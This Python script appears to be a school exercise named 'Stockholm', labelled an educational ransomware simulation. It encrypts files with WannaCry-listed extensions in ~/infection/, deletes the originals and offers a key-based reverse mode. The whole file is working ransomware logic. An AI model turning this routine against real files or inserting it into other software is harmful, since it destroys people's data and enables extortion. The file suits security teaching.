#!/usr/bin/env python3
# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    Stockholm                                          :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: yitani <yitani@student.42.fr>              +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2025/11/08 23:17:45 by yitani            #+#    #+#              #
#    Updated: 2025/11/08 23:18:13 by yitani           ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

from cryptography.fernet import Fernet
from sys import argv
import os
import argparse

def	encrypt(flag='loud'):
	try:
		path = os.getcwd()
		key = Fernet.generate_key()
		fernet = Fernet(key)
	except Exception:
		if flag == 'loud':
			print("Error: fernet")
	try:
		os.chdir(os.path.expanduser("~/infection/"))
		files = os.listdir('.')
		if flag == 'loud':
			print("Changed directory to ~/infection/ successfully")
	except Exception:
		if flag == 'loud':
			print("Error: Failed to load ~/infection/ directory")
		exit(1)
	for file in files:
		if file.endswith(tuple(WANNACRY_EXTENSIONS)):
			try:
				fileObject = open(file, 'rb')
				if flag == 'loud':
					print("opened", file)
				fileContent = fileObject.read()
				fileObject.close()
				encryptedData = fernet.encrypt(fileContent)
				fileObject = open(file+'.ft', 'wb')
				fileObject.write(encryptedData)
				if flag == 'loud':
					print("Encrypted", file, "in " + file + ".ft")
				fileObject.close()
				os.remove(file)
			except Exception:
				if flag == 'loud':
					print("Error removing decrypted file")
					exit(1)
	if flag == 'loud':
		print("Your encryption key is \'", key.decode(), "\'")
	else:
		try:
			os.chdir(path)
			fkey = open("Stockholm.key", "wb")
			fkey.write(key)
			fkey.close()
		except Exception:
			exit(1)

def	reverse(userKey, flag='loud'):
	try:
		fernet = Fernet(userKey)
	except Exception:
		if flag == 'loud':
			print("Error invalid key")
		exit(1)
	try:
		os.chdir(os.path.expanduser("~/infection/"))
		files = os.listdir('.')
		if flag == 'loud':
			print("Changed directory to ~/infection/ successfully")
	except Exception:
		if flag == 'loud':
			print("Error: Failed to load ~/infection/ directory")
		exit(1)
	for file in files:
		if file.endswith('.ft'):
			try:
				fileObject = open(file, 'rb')
				if flag == 'loud':
					print("opened", file)
				fileContent = fileObject.read()
				fileObject.close()
				decryptedData = fernet.decrypt(fileContent)
				fileObject = open(file.removesuffix('.ft'), 'wb')
				fileObject.write(decryptedData)
				if flag == 'loud':
					print("Decrypted", file)
				fileObject.close()
				os.remove(file)
			except Exception:
				if flag == 'loud':
					print("Error removing decrypted file")
					exit(1)

WANNACRY_EXTENSIONS = {
						'.doc', '.docx', '.dotm', '.dotx', '.docb', '.xlsm', '.xlsx', '.xlsb', 
						'.xltx', '.xltm', '.ppt', '.pptm', '.pptx', '.potm', '.potx', '.ppam', 
						'.ppsx', '.ppsm', '.pdf', '.odt', '.sxc', '.sxd', '.sxi', '.sxw', 
						'.slk', '.wb2', '.hwp', '.sql', '.accdb', '.mdb', '.dbf', '.odb', 
						'.myd', '.myi', '.ibd', '.frm', '.sqlite3', '.sqlitedb', '.edb', 
						'.eml', '.msg', '.ost', '.pst', '.snt', '.zip', '.rar', '.tar', 
						'.tgz', '.tbk', '.bz2', '.ARC', '.PAQ', '.mp4', '.mkv', '.avi', 
						'.mov', '.mpeg', '.mpg', '.wma', '.wmv', '.mid', '.wav', '.mp3', 
						'.asf', '.3g2', '.3gp', '.flv', '.fla', '.swf', '.png', '.jpeg', 
						'.jpg', '.bmp', '.gif', '.raw', '.nef', '.svg', '.psd', '.tif', 
						'.tiff', '.vsd', '.odg', '.php', '.java', '.class', '.cpp', '.pas', 
						'.asm', '.cs', '.c' , '.h', '.sch', '.vb', '.vbs', '.js', '.jsp', '.pl', 
						'.rb', '.sh', '.key', '.pfx', '.pem', '.p12', '.csr', '.gpg', 
						'.aes', '.vmx', '.vmdk', '.vdi', '.txt', '.lay6', '.backup', '.max', 
						'.uop', '.uot', '.rtf', '.dwg', '.m3u', '.m4u', '.der', '.dif', 
						'.dip', '.vcd', '.sln', '.suo', '.iso'
						}

parser = argparse.ArgumentParser(description="Stockholm - Educational Ransomware Simulation")
parser.add_argument('-v', '--version', action='store_true', help='Show program version')
parser.add_argument('-r', '--reverse', type=str, metavar='KEY', help='Decrypt files using the provided key')
parser.add_argument('-s', '--silent', action='store_true', help='Run without producing output')
args = parser.parse_args()
argc = len(argv)

if args.version:
	if argc > 2:
		print("Error: -v/--version cannot be used with other arguments")
		exit(1)
	else:
		print("Version \"1.0.2\"")
		exit(0)

if args.silent:
	if args.reverse:
		reverse(args.reverse, '-s')
	else:
		encrypt('-s')

elif args.reverse:
	reverse(args.reverse)

else:
	encrypt()
